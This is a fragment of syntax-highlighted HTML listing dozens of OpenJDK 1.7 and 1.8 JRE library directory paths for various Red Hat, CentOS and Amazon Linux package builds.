<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.91</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.102</span><span class="token operator">-</span><span class="token number">1.</span>b14<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">0.</span>b15<span class="token punctuation">.</span>el6_8<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">1.</span>b15<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">2.</span>b15<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.121</span><span class="token operator">-</span><span class="token number">0.</span>b13<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">0.</span>b11<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.</span>b11<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">3.</span>b12<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">1.</span>b16<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">3.</span>b16<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.144</span><span class="token operator">-</span><span class="token number">0.</span>b01<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.144</span><span class="token operator">-</span><span class="token number">0.</span>b01<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">5.</span>b12<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">3.</span>b14<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">3.</span>b10<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">1.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">0.</span>amzn2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">2.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.222</span><span class="token punctuation">.</span>b10<span class="token operator">-</span><span class="token number">0.</span>el7_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.282</span><span class="token punctuation">.</span>b08<span class="token operator">-</span><span class="token number">1.</span>el7_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">2.</span>b13<span class="token punctuation">.</span><span class="token number">5.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">2.</span>b17<span class="token punctuation">.</span><span class="token number">7.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.77</span><span class="token operator">-</span><span class="token number">0.</span>b03<span class="token punctuation">.</span><span class="token number">9.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.6</span><span class="token number">.1</span><span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.9</span><span class="token number">.0</span><span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.91</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span><span class="token number">10.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.10</span><span class="token number">.1</span><span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token number">.0</span><span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.191</span><span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.15</span><span class="token number">.4</span><span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span><span class="token number">24.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">1.</span>b15<span class="token punctuation">.</span><span class="token number">25.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.121</span><span class="token operator">-</span><span class="token number">0.</span>b13<span class="token punctuation">.</span><span class="token number">29.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.</span>b11<span class="token punctuation">.</span><span class="token number">30.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">1.</span>b16<span class="token punctuation">.</span><span class="token number">32.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span><span class="token number">35.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span><span class="token number">36.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">7.</span>b10<span class="token punctuation">.</span><span class="token number">37.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span><span class="token number">38.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.42</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.201</span><span class="token punctuation">.</span>b09<span class="token operator">-</span><span class="token number">0.43</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.212</span><span class="token punctuation">.</span>b04<span class="token operator">-</span><span class="token number">0.45</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">8.</span>b10<span class="token punctuation">.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
